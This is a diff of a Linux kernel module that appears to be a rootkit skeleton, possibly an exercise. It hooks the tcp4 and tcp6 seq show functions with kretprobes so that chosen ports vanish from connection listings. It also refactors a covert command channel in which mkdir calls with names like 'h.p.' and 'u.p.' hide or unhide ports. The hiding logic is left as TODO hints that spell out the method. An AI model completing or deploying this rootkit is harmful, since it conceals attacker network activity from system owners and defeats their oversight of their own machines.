@@ -14,7 +14,6 @@
 #define RK_PATH_MAX	128
 #define RK_TARGET_MAX	32
 #define RK_NAME_MAX	64
-#define SEQ_START_TOKEN ((void *)1)
 
 struct rk_target_list {
 	spinlock_t lock;
@@ -24,7 +23,9 @@ struct rk_target_list {
 
 static struct rk_target_list port_targets;
 
-// Implement add, remove, and match for the target list.
+// TODO: rk_target_add (strscpy into targets[count], return -ENOSPC if full)
+// TODO: rk_target_remove (validate idx, memmove to close gap)
+// TODO: rk_target_match (strcmp loop, return true on hit)
 
 static int rk_target_add(struct rk_target_list *list, const char *name)
 {
@@ -46,13 +47,13 @@ struct tcp_show_data {
 
 static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	// Save seq->count and the sock pointer.
+	// TODO: save seq->count and sock from direct regs (NOT inner pt_regs)
 	return 0;
 }
 
 static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	// If the port matches a target, rewind seq->count to hide the line.
+	// TODO: skip SEQ_START_TOKEN, extract port via inet_sk, rewind seq->count if match
 	return 0;
 }
 
@@ -74,19 +75,46 @@ static struct kretprobe tcp6_probe = {
 
 /* ---- mkdir command dispatcher (provided) ---- */
 
+typedef int (*rk_handler_t)(const char *arg);
+
+struct rk_cmd_entry {
+	const char *key;
+	rk_handler_t handler;
+};
+
+static int cmd_hide_port(const char *arg)   { return rk_target_add(&port_targets, arg); }
+static int cmd_unhide_port(const char *arg) { int i; return kstrtoint(arg, 10, &i) == 0 ? rk_target_remove(&port_targets, i) : -EINVAL; }
+
+static const struct rk_cmd_entry cmd_table[] = {
+	{ "h.p", cmd_hide_port },
+	{ "u.p", cmd_unhide_port },
+};
+
 static int rk_dispatch(const char *name)
 {
-	int idx;
+	const struct rk_cmd_entry *best = NULL;
+	int best_len = 0;
+	const char *arg;
+	int i;
 
-	if (strncmp(name, "h.p.", 4) == 0)
-		return rk_target_add(&port_targets, name + 4);
-	if (strncmp(name, "u.p.", 4) == 0) {
-		if (kstrtoint(name + 4, 10, &idx) == 0)
-			return rk_target_remove(&port_targets, idx);
-		return -EINVAL;
+	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
+		int klen = strlen(cmd_table[i].key);
+
+		if (strncmp(name, cmd_table[i].key, klen) != 0)
+			continue;
+		if (name[klen] != '\0' && name[klen] != '.')
+			continue;
+		if (klen > best_len) {
+			best = &cmd_table[i];
+			best_len = klen;
+		}
 	}
 
-	return -ENOENT;
+	if (!best)
+		return -ENOENT;
+
+	arg = name[best_len] == '.' ? name + best_len + 1 : NULL;
+	return best->handler(arg);
 }
 
 struct rk_mkdir_data {
@@ -179,14 +207,14 @@ static int __init rk_init(void)
 
 	spin_lock_init(&port_targets.lock);
 
-	// Register tcp4, tcp6, and mkdir probes with goto rollback.
+	// TODO: register tcp4 + tcp6 + mkdir probes with goto rollback, pr_info loaded
 
 	return 0;
 }
 
 static void __exit rk_exit(void)
 {
-	// Unregister probes in reverse order.
+	// TODO: unregister probes in reverse, pr_info unloaded
 }
 
 module_init(rk_init);
